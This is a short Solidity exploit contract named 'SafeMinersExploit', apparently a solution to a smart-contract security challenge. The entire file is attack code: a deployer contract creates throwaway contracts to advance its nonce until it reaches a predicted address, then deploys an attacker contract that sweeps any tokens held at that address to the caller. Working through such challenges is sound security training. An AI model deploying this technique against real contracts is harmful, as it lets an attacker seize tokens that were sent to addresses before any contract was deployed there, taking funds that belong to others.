// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/**
 * @title SafeMinersExploit
 * @author Georgi Nikolaev Georgiev
 */
contract EmptyContract {

}

contract DeployerContract {
    constructor(uint256 nonce, IERC20 token) {
        for (uint256 i = 1; i < nonce; ) {
            new EmptyContract();
            unchecked {
                ++i;
            }
        }
        new AttackerContract(msg.sender, token);
    }
}

contract AttackerContract {
    constructor(address recipient, IERC20 token) {
        uint256 balance = token.balanceOf(address(this));
        if (balance == 0) revert();
        token.transfer(recipient, balance);
    }
}
